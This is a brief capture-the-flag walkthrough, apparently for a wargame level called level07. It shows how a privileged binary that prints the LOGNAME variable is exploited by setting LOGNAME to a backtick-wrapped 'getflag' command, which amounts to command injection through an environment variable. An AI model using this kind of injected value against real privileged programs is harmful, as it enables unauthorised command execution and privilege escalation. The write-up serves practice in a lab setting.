## Step 1
> ls -l ~

We saw one executable ``level07``, executed by flag07.

## Step 2
> strings level07

The file displays the environment variable ``LOGNAME``.

## Step 3
> export LOGNAME='`getflag`'

By that, we were able to display the flag really simply.
